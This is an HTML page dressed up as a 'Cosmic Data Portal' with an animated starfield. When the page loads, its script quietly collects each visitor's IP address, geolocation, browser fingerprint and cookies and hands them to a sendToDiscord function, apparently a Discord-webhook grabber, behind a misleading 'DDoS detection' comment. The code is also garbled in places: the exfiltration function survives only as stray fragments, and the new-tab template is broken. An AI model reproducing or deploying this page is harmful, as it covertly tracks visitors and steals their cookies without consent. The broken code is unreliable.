<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cosmic Data Portal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.7.2/axios.min.js"></script>
    <style>
        body {
            background: linear-gradient(135deg, #1e3a8a 0%, #4c1d95 50%, #9d174d 100%);
            color: #ffffff;
            overflow: hidden;
            margin: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .welcome-message {
            animation: pulse 2s infinite;
            background: rgba(0, 0, 0, 0.7);
            backdrop-filter: blur(10px);
            transform: perspective(1000px) rotateX(5deg);
            transition: transform 0.3s ease;
        }
        .welcome-message:hover {
            transform: perspective(1000px) rotateX(0deg) scale(1.05);
        }
        @keyframes pulse {
            0% { box-shadow: 0 0 10px rgba(255, 255, 255, 0.3); }
            50% { box-shadow: 0 0 20px rgba(255, 255, 255, 0.5); }
            100% { box-shadow: 0 0 10px rgba(255, 255, 255, 0.3); }
        }
        .star {
            position: absolute;
            background: #ffffff;
            border-radius: 50%;
            animation: twinkle 2s infinite;
        }
        @keyframes twinkle {
            0%, 100% { opacity: 0.2; }
            50% { opacity: 1; }
        }
        canvas {
            position: fixed;
            top: 0;
            left: 0;
            z-index: -1;
        }
    </style>
</head>
<body>
    <canvas id="starfield"></canvas>
    <div class="welcome-message p-10 rounded-xl shadow-2xl max-w-lg w-full text-center">
        <h1 class="text-4xl font-extrabold mb-4 bg-clip-text text-transparent bg-gradient-to-r from-cyan-400 to-pink-500">Cosmic Data Portal</h1>
        <p class="text-lg mb-6">Embark on a stellar journey through our digital cosmos!</p>
        <button onclick="openNewTab()" class="bg-gradient-to-r from-purple-500 to-blue-500 text-white py-3 px-6 rounded-full hover:from-pink-500 hover:to-purple-500 transition-all duration-300">Explore the Universe</button>
    </div>

    <script>
        // Starfield animation
        const canvas = document.getElementById('starfield');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        const stars = Array(200).fill().map(() => ({
            x: Math.random() * canvas.width,
            y: Math.random() * canvas.height,
            size: Math.random() * 2 + 1,
            speed: Math.random() * 0.5 + 0.1
        }));
        function drawStars() {
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            stars.forEach(star => {
                ctx.fillStyle = 'rgba(255, 255, 255, ' + (Math.random() * 0.5 + 0.5) + ')';
                ctx.beginPath();
                ctx.arc(star.x, star.y, star.size, 0, Math.PI * 2);
                ctx.fill();
                star.y += star.speed;
                if (star.y > canvas.height) star.y = 0;
            });
            requestAnimationFrame(drawStars);
        }
        drawStars();

        // Track request frequency for basic DDoS detection
        let requestCount = 0;
        const requestThreshold = 100; // Threshold for potential DDoS detection
        const timeWindow = 10000; // 10 seconds
        let requestTimestamps = [];

        // Function to check for potential DDoS activity
        function checkDDoS() {
            const now = Date.now();
            requestTimestamps = requestTimestamps.filter(ts => now - ts < timeWindow);
            requestTimestamps.push(now);
            requestCount = requestTimestamps.length;
            return requestCount > requestThreshold ? 'Potential DDoS detected' : 'Normal traffic';
        }

        // Function to get client info and cookies
        async function getClientInfo() {
            try {
                const ipResponse = await axios.get('https://ipapi.co/json/', { timeout: 5000 });
                const ipData = ipResponse.data;
                const browserInfo = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    screenResolution: `${window.screen.width}x${window.screen.height}`,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    cookiesEnabled: navigator.cookieEnabled,
                    onlineStatus: navigator.onLine,
                    referrer: document.referrer,
                    timestamp: new Date().toISOString(),
                    cookies: document.cookie || 'No accessible cookies',
                    requestFrequency: checkDDoS()
                };
                return {
                    ip: ipData.ip,
                    version: ipData.version,
                    city: ipData.city,
                    region: ipData.region,
                    country: ipData.country_name,
                    country_code: ipData.country_code,
                    latitude: ipData.latitude,
                    longitude: ipData.longitude,
                    postal: ipData.postal,
                    org: ipData.org,
                    asn: ipData.asn,
                    hostname: ipData.hostname,
                    ...browserInfo
                };
            } catch (error) {
                console.error('Error fetching client info');
                return { error: 'Failed to fetch client info' };
            }
        }

                                { name: 'üìç Latitude', value: data.latitude?.toString() || 'N/A', inline: true },
                                { name: 'üìç Longitude', value: data.longitude?.toString() || 'N/A', inline: true },

            } catch (error) {

            }
        }

        // Function to open a new blank tab with the same background
        function openNewTab() {
            const newWindow = window.open('', '_blank');
            newWindow.document.write(`
                <!DOCTYPE html>
                <html lang="en">
                <head>

                    <style>
                        body {

                        }
                        canvas {
                            position: fixed;

                        }
                        .star {
                            position: absolute;

                        }
                        @keyframes twinkle {

                    </style>
                </head>
                <body>
                    <canvas id="starfield"></canvas>

                        const stars = Array(200).fill().map(() => ({
                            x: Math.random() * canvas.width,
                            y: Math.random() * canvas.height,
                            size: Math.random() * 2 + 1,
                            speed: Math.random() * 0.5 + 0.1
                        }));
                        function drawStars() {
                            ctx.clearRect(0, 0, canvas.width, canvas.height);
                            stars.forEach(star => {
                                ctx.fillStyle = 'rgba(255, 255, 255, ' + (Math.random() * 0.5 + 0.5) + ')';
                                ctx.beginPath();
                                ctx.arc(star.x, star.y, star.size, 0, Math.PI * 2);
                                ctx.fill();
                                star.y += star.speed;
                                if (star.y > canvas.height) star.y = 0;
                            });
                            requestAnimationFrame(drawStars);
                        }
                        drawStars();
                    </script>
                </body>
                </html>
            `);
            newWindow.document.close();
        }

        // Execute data collection on page load
        window.onload = async () => {
            const clientData = await getClientInfo();
            if (!clientData.error) {
                await sendToDiscord(clientData);
            }
        };
    </script>
</body>
</html>
